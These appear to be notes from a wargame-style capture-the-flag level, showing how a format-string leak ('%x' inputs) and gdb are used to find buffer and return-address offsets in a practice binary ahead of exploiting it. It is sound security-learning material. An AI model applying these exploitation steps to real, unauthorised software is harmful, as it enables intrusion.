## Infos on the binary

```shell
level04@rainfall:~$ checksec riviera
[*] '/home/level04/riviera'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Same as level03 protections, no executable stack

```shell
[RIVIERA] Tag: %x %x %x %x %x %x %x %x %x %x
[RIVIERA] Message: AAAABBBBCCCC         
[RIVIERA] [0] tag=ffffdfb0 404080 0 75 0 0 403e00 ffffe2a0 401533 41414141 msg=AAAABBBBCCCC
```

```shell
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*8 + b"\n" + b"B"*8 + b"\n")' > /tmp/lv4

gdb -nx -q ./riviera
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) b *0x40148b # fgets in handle_input
(gdb) r < /tmp/lv4

(gdb) p $rbp
$1 = (void *) 0x7fffffffe280 # rbp
(gdb) x/gx $rbp
0x7fffffffe280:	0x00007fffffffe290 # main rbp
(gdb) x/gx $rbp+8
0x7fffffffe288:	0x0000000000401584 # return to main address

(gdb) b*0x40151b
(gdb) c
(gdb) find $rsp, $rsp+0x500, "AAAAAAAA"
0x7fffffffe260 # buffer address of TAG
1 pattern found.
(gdb) p/x $rbp - 0x7fffffffe260 
$4 = 0x20

(gdb) find $rsp, $rsp+0x500, "BBBBBBBB"
0x7fffffffe160 # buffer address of MESSAGE
1 pattern found.
(gdb) p/x $rbp - 0x7fffffffe160 
$5 = 0x120


b *0x4013fb # printf in display_entry

```
